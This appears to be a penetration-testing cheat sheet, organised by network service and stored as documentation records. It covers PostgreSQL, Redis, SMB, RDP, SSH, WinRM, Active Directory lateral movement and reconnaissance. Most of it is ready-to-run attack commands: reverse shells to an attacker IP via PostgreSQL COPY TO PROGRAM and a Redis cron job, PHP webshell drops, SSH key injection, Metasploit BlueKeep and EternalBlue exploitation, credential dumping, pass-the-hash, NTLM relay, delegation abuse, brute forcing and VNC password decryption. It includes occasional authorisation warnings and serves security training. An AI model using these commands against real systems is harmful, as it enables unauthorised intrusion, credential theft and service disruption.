SELECT current_user;                    -- current user
SELECT usename, passwd FROM pg_shadow;  -- password hashes (superuser only)

docs.title: File Read / Write (COPY)
docs.text:
Read a file from the host:

CREATE TABLE tmp (content TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

Write a file to disk:

COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

docs.title: OS Command Execution (COPY TO/FROM PROGRAM)
docs.text:
Available in PostgreSQL 9.3+:

COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;

Reverse shell:

COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1"';

docs.title: Privilege Check
docs.text:
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;

Real-world

PostgreSQL is common in Linux environments and often runs as the postgres OS user. If you get RCE via COPY TO PROGRAM, you're executing as that user — check sudo -l immediately. Trust authentication (pg_hba.conf) misconfiguration is the most common finding: connections from 127.0.0.1/32 allowed without a password.

docs.title: R-Services (512–514)
docs.text:
Start here

Try passwordless rlogin immediately: rlogin -l root 10.10.10.10. If .rhosts contains + + or trusts your source IP, you get a shell with no credentials. Also test rsh -l root 10.10.10.10 id. These services are rare but almost always misconfigured when present.

docs.title: Enumeration
docs.text: nmap -p 512-514 --script rexec-brute,rsh-brute,rlogin-brute 10.10.10.10

docs.title: Trust-Based Access (rlogin / rsh)
docs.text:
rlogin -l root 10.10.10.10
rsh -l root 10.10.10.10 id
rsh -l root 10.10.10.10

Authentication relies on /etc/hosts.equiv and ~/.rhosts. If either contains + +, any host can authenticate as any user.

docs.title: Brute Force
docs.text:
hydra -L users.txt -P passwords.txt rexec://10.10.10.10
hydra -L users.txt -P passwords.txt rlogin://10.10.10.10

docs.title: Remote Execution (rexec)
docs.text:
rexec 10.10.10.10 -l <user> -p <pass> "id"

Real-world

R-services predate SSH and have no encryption — all traffic including credentials is cleartext. They're nearly extinct on modern systems but occasionally show up on legacy Unix hosts, embedded devices, or old network appliances. When you find them, trust-based access is the first thing to check before touching brute force.

docs.title: RDP (3389)
docs.text:
Start here

With valid credentials, connect directly: xfreerdp /u:<user> /p:<pass> /v:10.10.10.10. Pass-the-hash works if Restricted Admin mode is enabled: xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10.

Watch out

RDP brute force generates Event ID 4625 entries rapidly. Avoid it unless you've confirmed there's no account lockout policy.

docs.title: Enumeration
docs.text: nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.10.10

docs.title: Connect
docs.text:
xfreerdp /u:<user> /p:<pass> /v:10.10.10.10 /dynamic-resolution
xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10 /dynamic-resolution

docs.title: Brute Force
docs.text:
hydra -L users.txt -P passwords.txt rdp://10.10.10.10
ncrack -p 3389 -U users.txt -P passwords.txt 10.10.10.10

docs.title: BlueKeep (CVE-2019-0708)
docs.text:
Unauthenticated RCE against Windows 7 / Server 2008 R2 and earlier. There's no stock nmap NSE script for BlueKeep — use the Metasploit scanner:

msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 10.10.10.10
run

If vulnerable, swap to the exploit module:

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit

Watch out

The BlueKeep exploit module crashes the target more often than it lands a shell. Don't run it against production without explicit authorization — a BSOD on a terminal server takes every user session with it.

Real-world

RDP is often blocked externally but wide open internally. After getting initial access, check if domain credentials work over RDP against other hosts — it's one of the fastest ways to move laterally. BlueKeep is mostly patched at this point but still worth checking on older infrastructure.

docs.title: Redis (6379)
docs.text:
Start here

Connect without credentials: redis-cli -h 10.10.10.10. Run INFO — if it responds, you have unauthenticated access. Check if you can write to disk with CONFIG SET dir and CONFIG SET dbfilename — this is the path to SSH key injection or webshell drops.

docs.title: Enumeration
docs.text:
nmap -p 6379 --script redis-info 10.10.10.10
redis-cli -h 10.10.10.10

docs.title: Basic Interaction
docs.text:
redis-cli -h 10.10.10.10
redis-cli -h 10.10.10.10 -a <password>

# Once connected:
INFO                    # server info, OS, config file location
CONFIG GET *            # dump full configuration
KEYS *                  # list all keys
GET <key>               # read a key value

docs.title: SSH Key Injection
docs.text:
If Redis can write files and SSH is running:

Watch out

FLUSHALL wipes the entire Redis database. Fine on a CTF box — on a real engagement, this is a service-disrupting action. Document the operation, get explicit authorization first, and if possible snapshot the keyspace with SAVE and copy the RDB file before flushing. Consider using a unique key name without FLUSHALL unless the target key must start at offset zero.

# Generate a key pair
ssh-keygen -t rsa -f /tmp/redis_key

# Write the public key into Redis
echo -e "\n\n" >> /tmp/redis_key.pub
redis-cli -h 10.10.10.10 FLUSHALL
cat /tmp/redis_key.pub | redis-cli -h 10.10.10.10 -x SET pwn

# Set the write path to root's .ssh directory
redis-cli -h 10.10.10.10 CONFIG SET dir /root/.ssh
redis-cli -h 10.10.10.10 CONFIG SET dbfilename authorized_keys
redis-cli -h 10.10.10.10 BGSAVE

# Connect
ssh -i /tmp/redis_key root@10.10.10.10

docs.title: Web Shell via File Write
docs.text:
If a web server is running and you can identify the web root from INFO:

redis-cli -h 10.10.10.10 CONFIG SET dir /var/www/html
redis-cli -h 10.10.10.10 CONFIG SET dbfilename shell.php
redis-cli -h 10.10.10.10 SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h 10.10.10.10 BGSAVE

docs.title: Cron Job for Reverse Shell
docs.text:
redis-cli -h 10.10.10.10 CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h 10.10.10.10 CONFIG SET dbfilename root
redis-cli -h 10.10.10.10 SET cron "\n\n* * * * * bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1\n\n"
redis-cli -h 10.10.10.10 BGSAVE

docs.title: Brute Force (if password protected)
docs.text:
hydra -P /usr/share/wordlists/rockyou.txt redis://10.10.10.10

Real-world

Redis without a password is still extremely common — it was designed as an in-memory cache on trusted internal networks, and auth was an afterthought. The SSH key injection technique works reliably when Redis runs as root (common on misconfigured servers). Even when it's not root, the web shell or cron path is often viable. Always check what user Redis is running as with INFO server before choosing an attack path.

docs.title: Rsync (873)
docs.text:
Start here

List modules anonymously: rsync -av --list-only rsync://10.10.10.10. If modules appear, pull them without credentials: rsync -av rsync://10.10.10.10/<module> ./. Look for SSH keys, config backups, and database dumps in what comes back.

docs.title: Enumeration
docs.text:
nmap -p 873 --script rsync-list-modules 10.10.10.10
rsync -av --list-only rsync://10.10.10.10

docs.title: Download Files
docs.text:
# Entire module
rsync -av rsync://10.10.10.10/<module> ./loot/

# Single file
rsync -av rsync://10.10.10.10/<module>/path/to/file.txt ./

docs.title: Upload Files
docs.text:
If the module is writable:

rsync -av ./shell.php rsync://10.10.10.10/<module>/path/

docs.title: Brute Force
docs.text: hydra -L users.txt -P passwords.txt rsync://10.10.10.10

docs.title: SSH Key Theft
docs.text:
If home directories are exposed:

rsync -av rsync://10.10.10.10/<module>/home/user/.ssh/id_rsa ./
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.10

Real-world

Rsync without authentication is a misconfiguration that mostly shows up on backup servers and internal infrastructure. Modules that expose /home, /etc, or application directories are high-value — pull everything and grep offline. Write access to a web-accessible path is a direct shell upload.

docs.title: SMB (139, 445)
docs.text:
Start here

Check null session first: netexec smb 10.10.10.10 -u '' -p ''. If that fails, try guest:guest. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.

docs.title: Enumeration
docs.text:
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
nxc smb 10.10.10.10
enum4linux-ng -A 10.10.10.10

docs.title: Share Enumeration
docs.text:
smbclient -L //10.10.10.10 -U ''
smbclient -L //10.10.10.10 -U guest
nmap --script smb-enum-shares -p 445 10.10.10.10
nxc smb 10.10.10.10 --shares

Connect to a share:

smbclient //10.10.10.10/ShareName -U <user>

Download files once connected:

smb> get filename
smb> mget *

docs.title: Brute Force
docs.text:
nxc smb 10.10.10.10 -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://10.10.10.10

docs.title: Pass-the-Hash
docs.text:
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
impacket-smbexec EXAMPLE/Administrator@10.10.10.10 -hashes :<ntlm-hash>

docs.title: Credential Dumping
docs.text:
secretsdump.py EXAMPLE/<user>@10.10.10.10
secretsdump.py EXAMPLE/<user>@10.10.10.10 -hashes :<ntlm-hash>

docs.title: NTLM Relay
docs.text:
Capture and relay NTLMv2 authentication to SMB:

responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support

docs.title: EternalBlue (MS17-010)
docs.text:
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10

If vulnerable:

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit

Real-world

SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt.

docs.title: SMTP (25, 465, 587)
docs.text:
Start here

Enumerate users via VRFY: smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10. If VRFY is disabled, try EXPN or RCPT TO. A valid username list from SMTP is useful for password spraying against SMB, WinRM, and RDP.

docs.title: Enumeration
docs.text:
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay 10.10.10.10
nc -nv 10.10.10.10 25

docs.title: User Enumeration
docs.text:
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.10.10
smtp-user-enum -M RCPT -U users.txt -t 10.10.10.10

Via Nmap:

nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} 10.10.10.10

docs.title: Open Relay Check
docs.text:
nmap -p 25,465,587 --script smtp-open-relay 10.10.10.10

If an open relay is confirmed, send a spoofed email:

sendemail -f spoofed@example.com -t victim@target.com -s 10.10.10.10:25 -u "Test" -m "Message body"

docs.title: Brute Force
docs.text:
hydra -L users.txt -P passwords.txt smtp://10.10.10.10

Real-world

SMTP user enumeration is a solid early step — VRFY and EXPN are often left enabled on internal mail servers. An open relay is worth documenting as a finding even if you don't exploit it; it's straightforwardly demonstrable (send a spoofed email) and clients understand the risk immediately.

docs.title: SNMP Multiplexer (199)
docs.text:
Start here

UDP 199 is the SNMP MUX — it forwards queries to the SNMP engine. If port 161 is filtered but 199 is open, try querying directly: snmpwalk -v1 -c public 10.10.10.10:199. Otherwise, treat this as a signal that SNMP is running and focus enumeration on port 161.

docs.title: Enumeration
docs.text:
nmap -sU -p 199 10.10.10.10
snmpwalk -v1 -c public 10.10.10.10:199

If SNMP on port 161 is accessible, see the SNMP (161, 162) page for full enumeration.

docs.title: SNMP (161, 162)
docs.text:
Start here

Default community string is public. Try: snmpwalk -v2c -c public 10.10.10.10. If it returns data, enumerate further with snmp-check 10.10.10.10 for users, running processes, and installed software. SNMPv1/v2c sends community strings in cleartext — capture it from the wire if you can.

Watch out

SNMPv3 requires credentials and brute forcing is slow. SNMPv1/v2c is the target.

docs.title: Enumeration
docs.text: sudo nmap -sU -p 161 --script "snmp-*" 10.10.10.10

docs.title: Community String Brute Force
docs.text:
nmap -sU -p 161 --script snmp-brute 10.10.10.10
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10

docs.title: SNMP Walk
docs.text:
snmpwalk -v2c -c public 10.10.10.10
snmp-check 10.10.10.10

Targeted OID queries:

snmpwalk -v1 -c public 10.10.10.10 1.3.6.1.2.1.1           # system info
snmpwalk -v1 -c public 10.10.10.10 1.3.6.1.4.1.77.1.2.25   # user accounts
snmpwalk -v1 -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v1 -c public 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2  # installed software
snmpwalk -v1 -c public 10.10.10.10 1.3.6.1.2.1.6.13.1.3    # open TCP ports

Real-world

SNMP with public still shows up constantly on network gear — switches, printers, UPS devices, routers. The OID for running processes and installed software often reveals the exact OS and application versions you need for exploit selection. If you find a read-write community string (private), you can potentially modify device config.

docs.title: SSH (22)
docs.text:
Start here

Check what auth methods are enabled: ssh -v user@10.10.10.10 — look for publickey,password. If password auth is on and you have a username, brute force is viable. Run ssh-audit 10.10.10.10 to check for weak algorithms and known vulnerabilities.

docs.title: Enumeration
docs.text:
nmap -p 22 -sV --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.10.10.10
ssh-audit 10.10.10.10

docs.title: Brute Force
docs.text: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

docs.title: SSH Key Injection
docs.text:
If you have write access to a user's .ssh directory (via another vulnerability):

ssh-keygen -t ed25519 -f /tmp/injected_key
cat /tmp/injected_key.pub >> /home/user/.ssh/authorized_keys
ssh -i /tmp/injected_key user@10.10.10.10

docs.title: Finding Private Keys
docs.text:
Look for exposed private keys after gaining access:

find / -name id_rsa -o -name id_ed25519 2>/dev/null
grep -rl "PRIVATE KEY" / 2>/dev/null

Common locations: - /home/*/.ssh/id_rsa - /root/.ssh/id_rsa - Git repos, config backups, .bak files

Once found:

chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.10

docs.title: Local Port Forwarding
docs.text:
Forward an internal service to your attacker machine:

ssh -L 8080:127.0.0.1:8080 user@10.10.10.10
ssh -L 3306:127.0.0.1:3306 user@10.10.10.10

Real-world

SSH brute force is noisy and slow. A better path is username enumeration via Kerberos or SMTP, then targeted spraying with common passwords. Finding an exposed private key during post-exploitation is more reliable than bruteforcing. On cloud instances, check for default usernames (ubuntu, ec2-user, admin) with key-based auth before attempting passwords.

docs.title: Telnet (23)
docs.text:
Start here

Connect and check the banner: telnet 10.10.10.10. The banner often reveals the device type, OS, and version. Everything is cleartext — if you can capture traffic on the same segment, you get credentials for free.

docs.title: Enumeration
docs.text: nmap -p 23 --script telnet-ntlm-info,telnet-encryption 10.10.10.10

docs.title: Brute Force
docs.text:
hydra -L users.txt -P passwords.txt telnet://10.10.10.10
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10

Common default credentials by device type:

Device Username Password Cisco IOS admin admin / cisco Cisco IOS (blank) Juniper root (blank) Allied Telesis manager friend Generic admin password / 1234

docs.title: Traffic Capture
docs.text:
If positioned on the same network segment, Telnet credentials are cleartext:

sudo tcpdump -i eth0 port 23 -A -w telnet.pcap

Real-world

Telnet on modern servers is almost always a misconfiguration or a forgotten legacy install. On network gear (routers, switches, industrial control systems), it's much more common and often the only management interface available. Default credentials are worth trying before brute force — most network gear ships with known defaults and they rarely get changed.

docs.title: TFTP (69)
docs.text:
Start here

TFTP has no authentication — fetch common config files immediately: atftp --get --remote-file running-config --local-file running-config 10.10.10.10. Network device configs often contain SNMP community strings, local credentials, and VPN pre-shared keys.

docs.title: Enumeration
docs.text: nmap -sU -p 69 --script tftp-enum 10.10.10.10

docs.title: Fetching Files
docs.text:
atftp --get --remote-file running-config --local-file running-config 10.10.10.10
atftp --get --remote-file startup-config --local-file startup-config 10.10.10.10

Common files to try:

running-config
startup-config
config.cfg
router.conf
passwd
shadow

docs.title: Uploading Files
docs.text:
If the server allows writes, upload to a web-accessible path for a shell:

atftp --put --local-file shell.php --remote-file /var/www/html/shell.php 10.10.10.10

docs.title: PXE Boot Abuse
docs.text:
If the TFTP server is used for PXE booting, download boot files and check if they're writable:

tftp 10.10.10.10
tftp> get pxelinux.0
tftp> get boot.cfg
tftp> put malicious_pxeboot.efi

Real-world

TFTP mostly shows up on network gear (Cisco, Juniper) used for config backups, and on Windows Deployment Services for PXE. The config backup case is straightforward — pull and read. PXE write access is rare but devastating: any device that PXE boots will execute your image on reboot.

docs.title: VNC (5900)
docs.text:
Start here

Try connecting with no password first: vncviewer 10.10.10.10. Many VNC installs on internal networks have no authentication or use weak passwords. Brute force is fast — start with password, 1234, admin, vnc.

docs.title: Enumeration
docs.text:
nmap -p 5900-5910 --script vnc-info,vnc-brute 10.10.10.10

VNC can run on multiple displays — 5900 is display :0, 5901 is :1, etc. Scan the range.

docs.title: Connect
docs.text:
vncviewer 10.10.10.10
vncviewer 10.10.10.10:5901

docs.title: Brute Force
docs.text:
hydra -P /usr/share/seclists/Passwords/Default-Credentials/default-userpasscombo.txt vnc://10.10.10.10
hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.10.10

nmap -p 5900 --script vnc-brute 10.10.10.10

Via Metasploit:

use auxiliary/scanner/vnc/vnc_login
set RHOSTS 10.10.10.10
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

docs.title: Credential Locations
docs.text:
If you have shell access on the target, VNC passwords are stored obfuscated (DES, fixed key) and are trivially decryptable:

# Common locations
~/.vnc/passwd
/root/.vnc/passwd
/home/*/.vnc/passwd

Decrypt with:

msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt(File.read('/root/.vnc/passwd'), fixedkey).unpack('Z*').first

Real-world

VNC is common on internal networks for sysadmin remote access. It gives you a full GUI desktop session — you can see everything the user has open, access credential managers, and pivot from there without dropping any tools. Check for sessions on developer machines and servers where RDP may be blocked.

docs.title: WinRM (5985, 5986)
docs.text:
Start here

With valid credentials, connect directly: evil-winrm -i 10.10.10.10 -u <user> -p <pass>. Pass-the-hash also works: evil-winrm -i 10.10.10.10 -u <user> -H <ntlm-hash>. Port 5985 is HTTP, 5986 is HTTPS — check both.

docs.title: Enumeration
docs.text:
nmap -p 5985,5986 10.10.10.10
nxc winrm 10.10.10.10
curl -sk http://10.10.10.10:5985/wsman

docs.title: Brute Force
docs.text: nxc winrm 10.10.10.10 -u users.txt -p passwords.txt

docs.title: Shell via evil-winrm
docs.text:
evil-winrm -i 10.10.10.10 -u <user> -p <pass>
evil-winrm -i 10.10.10.10 -u <user> -H <ntlm-hash>

Upload/download files from within the shell:

*Evil-WinRM* PS> upload /path/to/local/file C:\destination
*Evil-WinRM* PS> download C:\path\to\remote\file /local/destination

docs.title: Remote Command Execution
docs.text:
nxc winrm 10.10.10.10 -u <user> -p <pass> -x "whoami"
nxc winrm 10.10.10.10 -u <user> -H <ntlm-hash> -x "ipconfig"

Real-world

WinRM is enabled by default on Windows Server 2012+ and is commonly used for legitimate remote management. If you have valid domain credentials, always check if they work on WinRM across the entire subnet — nxc winrm 10.10.10.0/24 -u <user> -p <pass> is a fast lateral movement check.

docs.title: Lateral Movement
docs.text:
After establishing a foothold, lateral movement extends access to other hosts in the network. The goal is to reach higher-value targets — file servers, domain controllers, databases — using credentials and tickets collected from the initial compromise.

Watch out

Lateral movement is the noisiest phase of an assessment. Every new host you touch generates authentication events (4624, 4648, 4769). Log every host you access — both for cleanup and for the report.

docs.title: 1. Assess What You Have
docs.text:
Before moving anywhere, take stock of your current credentials and access:

# What user are you?
whoami /all                          # Windows
id && cat /etc/passwd | grep -v nologin  # Linux

# What creds/hashes do you have?
cat /tmp/loot.txt                    # any dumped creds
# Check secretsdump output, mimikatz output, found config files

docs.title: 2. Validate Credentials Across the Network
docs.text:
Spray what you have against all discovered hosts before moving manually:

nxc smb 10.10.10.0/24 -u <user> -p '<pass>'          # password
nxc smb 10.10.10.0/24 -u <user> -H <ntlm-hash>       # hash
nxc winrm 10.10.10.0/24 -u <user> -p '<pass>'        # WinRM

Hosts returning (Pwn3d!) have local admin access.

docs.title: 3. Choose an Execution Method
docs.text:
Match the method to what's available on the target:

Available Best method Port 5985/5986 (WinRM) evil-winrm — most comfortable interactive shell Port 445 (SMB) + admin impacket-psexec or impacket-wmiexec Hash only (no plaintext) Pass-the-Hash via psexec, wmiexec, or evil-winrm -H Kerberos ticket Pass-the-Ticket — inject with Mimikatz or Rubeus NTLMv2 captured + SMB signing off NTLM relay with ntlmrelayx

See Windows Lateral Movement for execution method commands and Active Directory Lateral Movement for Kerberos-based movement.

docs.title: 4. Establish Access and Repeat
docs.text:
Once on a new host, repeat the privilege escalation process:

whoami /priv             # check token privileges immediately
net localgroup Administrators   # who has local admin?

Then repeat credential dumping and network spraying from the new position — you may now have access to a different network segment or higher-privilege credentials.

Real-world

Keep a simple text file tracking which hosts you've accessed, what credentials were used, and what you found. It saves time when writing the report and ensures nothing gets missed during cleanup.

docs.title: Active Directory Lateral Movement
docs.text: Pass-the-Ticket and Overpass-the-Hash let you move laterally using Kerberos tickets rather than NTLM hashes — useful when NTLM authentication is restricted or when you want to impersonate a specific domain user. Check klist after injecting a ticket to confirm it loaded.

docs.title: Pass-the-Ticket (PtT)
docs.text: Inject a Kerberos ticket (TGT or TGS) into your current session to authenticate as another user without their password.

docs.title: Export Tickets with Mimikatz
docs.text:
mimikatz # sekurlsa::tickets /export

Exports .kirbi files for all tickets in the current session.

docs.title: Inject a Ticket
docs.text:
mimikatz # kerberos::ptt ticket.kirbi
klist                          # verify the ticket loaded

docs.title: Rubeus (One-liner)
docs.text:
.\Rubeus.exe ptt /ticket:<base64-ticket>
.\Rubeus.exe dump /nowrap      # dump all tickets in base64

docs.title: Overpass-the-Hash (Pass-the-Key)
docs.text:
Convert an NTLM hash into a Kerberos TGT. Useful when you have a hash and the target enforces Kerberos (NTLMv2 blocked or SMB signing required).

mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe

Spawns a new cmd.exe with the injected Kerberos identity. Use klist in that process to confirm.

docs.title: With Rubeus
docs.text: .\Rubeus.exe asktgt /user:Administrator /rc4:<ntlm-hash> /ptt

docs.title: Ticket Extraction from Linux (ccache)
docs.text:
If you compromise a Linux host with Kerberos configured (e.g., a domain-joined Linux server), ccache files on disk may contain valid TGTs:

find / -name "krb5cc_*" 2>/dev/null
ls /tmp/krb5cc_*

export KRB5CCNAME=/tmp/krb5cc_<uid>
klist

# Use directly with Impacket tools
impacket-wmiexec -k -no-pass Administrator@dc.corp.local
nxc smb 10.10.10.10 -k --use-kcache

docs.title: DCOM Lateral Movement
docs.text:
Distributed COM execution — less signatured than PsExec on some EDR platforms.

impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10

From PowerShell (no external tools required):

$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Temp\out.txt","7")

docs.title: Resource-Based Constrained Delegation (RBCD)
docs.text: If you can write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target computer (typical when you have GenericAll / GenericWrite on the computer object, or control any account in a group with that right), you can impersonate any user — including Domain Admins — to that computer.

docs.title: Requirements
docs.text:
• A computer you control (existing or freshly created via MAQ)
  • Write access to msDS-AllowedToActOnBehalfOfOtherIdentity on the victim computer

docs.title: Create a computer account (if MAQ > 0)
docs.text:
Most domains allow any authenticated user to create up to 10 computer accounts (ms-DS-MachineAccountQuota default).

impacket-addcomputer example.com/<user>:'<pass>' -computer-name 'ATTACKER$' -computer-pass 'ComputerP@ss1' -dc-ip 10.10.10.10

docs.title: Set RBCD on the victim
docs.text: impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'VICTIM$' -action write example.com/<user>:'<pass>' -dc-ip 10.10.10.10

docs.title: Abuse via S4U2Self + S4U2Proxy
docs.text:
impacket-getST -spn cifs/victim.example.com -impersonate Administrator -dc-ip 10.10.10.10 example.com/'ATTACKER$':'ComputerP@ss1'

That drops Administrator.ccache. Use it:

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass victim.example.com

docs.title: Unconstrained Delegation + Coerce
docs.text:
Any computer with unconstrained delegation caches TGTs of every user who authenticates to it. Coerce a DC (or high-value user) to authenticate, then extract the TGT.

# Find unconstrained delegation targets
Get-DomainComputer -Unconstrained | Select-Object dnshostname

Coerce the DC with PetitPotam / PrinterBug:

impacket-petitpotam <unconstrained-host> 10.10.10.10     # DC authenticates to your host
# Or via printnightmare
dementor.py -d example.com -u <user> -p '<pass>' <unconstrained-host> 10.10.10.10

On the unconstrained host, extract the DC's TGT:

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

Use the DC's ticket to DCSync.

docs.title: NTLM Relay
docs.text:
If you capture NTLMv2 hashes via Responder and SMB signing is disabled on targets, relay them directly rather than cracking:

# Check which targets have SMB signing disabled
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# Disable SMB in Responder so ntlmrelayx handles it
sudo responder -I tun0 -wrf --disable-smb

# Relay to targets
sudo ntlmrelayx.py -tf targets.txt -smb2support -i   # interactive SMB shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

docs.title: Windows Lateral Movement
docs.text: Check what's accessible before picking a method: port 5985/5986 → WinRM (evil-winrm), port 445 → SMB (psexec/smbexec), WMI is always worth trying if you have admin creds. WMI is stealthier than PsExec — it doesn't create a service (Event ID 7045).

docs.title: Pass-the-Hash
docs.text: Use an NTLM hash directly without cracking it. Requires local admin rights on the target.

docs.title: NetExec (credential validation + command execution)
docs.text:
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash> -x "whoami"
nxc winrm 10.10.10.10 -u Administrator -H <ntlm-hash> -x "whoami"

docs.title: Evil-WinRM
docs.text: evil-winrm -i 10.10.10.10 -u Administrator -H <ntlm-hash>

docs.title: Impacket PsExec
docs.text: impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>

docs.title: Impacket WMIExec
docs.text: impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>

docs.title: WinRM (Evil-WinRM)
docs.text:
Most comfortable interactive shell for post-exploitation. Requires port 5985 (HTTP) or 5986 (HTTPS) and membership in the Remote Management Users group or local admin.

evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1'
evil-winrm -i 10.10.10.10 -u Administrator -H <ntlm-hash>

Upload/download files from within an evil-winrm session:

upload /local/file.exe C:\Temp\file.exe
download C:\Temp\loot.txt /local/loot.txt

docs.title: PsExec (Service-Based)
docs.text:
Creates a temporary service on the target — reliable but loud (Event ID 7045: service installed).

impacket-psexec CORP/Administrator:'Password1'@10.10.10.10
impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>

docs.title: WMI Execution (Stealthier)
docs.text:
No service creation. Generates Event ID 4688 (process creation). Preferred over PsExec when stealth matters.

impacket-wmiexec CORP/Administrator:'Password1'@10.10.10.10
impacket-wmiexec CORP/Administrator:'Password1'@10.10.10.10 "ipconfig /all"
impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>

docs.title: RDP
docs.text:
xfreerdp /u:Administrator /p:'Password1' /v:10.10.10.10
xfreerdp /u:Administrator /pth:<ntlm-hash> /v:10.10.10.10

Watch out

RDP creates interactive login events (Event ID 4624 Type 10) and a visible desktop session. Only use when stealth is not required or the environment has RDP enabled by default.

docs.title: Alternative SMB Execution Methods
docs.text:
Try these when PsExec/WMI are blocked or flagged:

impacket-smbexec CORP/Administrator:'Password1'@10.10.10.10
impacket-atexec CORP/Administrator:'Password1'@10.10.10.10 "whoami"
impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10

docs.title: SCShell (Service-Modify, No New Service)
docs.text:
Modifies an existing service's binPath, triggers it, then restores the original — no service creation (no Event ID 7045), no file written to SMB, no named pipe. Quieter than PsExec when you have SERVICE_CHANGE_CONFIG.

scshell.py CORP/Administrator:'Password1'@10.10.10.10 xps 'C:\Temp\shell.exe'

Args: <user>:<pass>@<host> <service-name> <command>. Pick a rarely-used service like XblAuthManager, RemoteRegistry, or Spooler to reduce operational impact.

docs.title: SOCKS Pivot After Foothold
docs.text:
Once you have a shell on an internal host, a SOCKS proxy lets you run nxc, evil-winrm, and Impacket tools from your attacker box against the rest of the internal network without hopping through the shell manually.

See Ligolo-ng & Chisel — ligolo-ng is the most reliable option for AD internal pivoting.

docs.title: Network Scanning & Recon
docs.text: Start here on every engagement. The goal is to build an accurate map of the attack surface before touching anything — what hosts are alive, what ports are open, what services are running, and who's on the network.

docs.title: 1. Passive Recon
docs.text:
Before sending a single packet, collect what's publicly available. Useful for external assessments and building a target list.

whois example.com
dig example.com ANY

Check certificate transparency for subdomains:

curl -s "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u

See Reconnaissance for OSINT techniques, subdomain enumeration, and Google dorking.

Real-world

On external engagements, passive recon often surfaces forgotten subdomains, exposed staging environments, and legacy VPN portals that don't appear in scope documents. Check before you scan.

docs.title: 2. Host Discovery
docs.text:
Identify live hosts before port scanning — especially important on large subnets.

nmap -sn 10.10.10.0/24

On an internal segment, ARP sweep is more reliable than ICMP — many hosts block ping but can't hide from ARP:

nmap -PR -sn 10.10.10.0/24

Watch out

Confirm target IPs are in scope before scanning. On real engagements, verify against the scope document — hitting out-of-scope hosts, even accidentally, is a significant problem.

docs.title: 3. Port Scanning
docs.text:
Quick scan first to get something to work with, full scan in the background while you start enumerating.

Quick scan (top 1000 ports):

nmap -sV --open -T4 10.10.10.10

Full TCP (run in background):

nmap -p- -T4 --open -oN nmap_full.txt 10.10.10.10

Targeted service scan once you have a port list:

nmap -sC -sV -p 22,80,443 10.10.10.10 -oN nmap_services.txt

See Network Scanning for RustScan, UDP scanning, and SMB vuln scripts.

docs.title: 4. Traffic Capture
docs.text:
Passive listening on an internal network can surface credentials, hashes, and host relationships without touching any target directly.

